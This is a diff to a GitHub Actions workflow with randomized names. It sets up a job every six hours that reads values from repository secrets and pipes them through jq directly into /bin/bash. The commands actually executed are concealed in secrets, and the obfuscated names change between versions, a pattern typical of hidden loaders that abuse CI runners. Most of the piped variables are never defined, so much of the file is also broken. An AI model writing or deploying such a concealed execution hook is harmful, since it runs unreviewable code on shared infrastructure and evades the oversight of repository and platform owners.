@@ -1,23 +1,25 @@
 name: pingtaiqkxm
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 4/6 * * *'
-jobs:  # 18519
+    - cron: '6 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: pingtaiqkxm
         env:
-          bglea70236: ${{ secrets.bglea70236 }}
+          htz54157: ${{ secrets.htz54157 }}
         run: |
-          echo $bglea70236 | jq -r .qxm15211 | /bin/bash
-          echo $lz19120 | jq -r .ka55 | /bin/bash
-          echo $d948 | jq -r .bwib28 | /bin/bash
-          echo $sy094 | jq -r .k64 | /bin/bash
-          echo $y15800 | jq -r .uokno2 | /bin/bash
-          echo $kobs6592 | jq -r .fq197 | /bin/bash
-          echo $y155 | jq -r .r0457 | /bin/bash
-          echo $f3596 | jq -r .n221 | /bin/bash
+          echo $htz54157 | jq -r .vq5938 | /bin/bash
+          echo $fugo2022 | jq -r .ndw52856 | /bin/bash
+          echo $zz82395 | jq -r .chuju82 | /bin/bash
+          echo $wf0 | jq -r .gpzt91 | /bin/bash
+          echo $dymzf5 | jq -r .jujrz97 | /bin/bash
+          echo $ikicv12 | jq -r .qv496 | /bin/bash
+          echo $el96716 | jq -r .dfrqy4464 | /bin/bash
+          echo $qp8 | jq -r .vib68230 | /bin/bash
+          echo $d31 | jq -r .nrnbx65 | /bin/bash
 
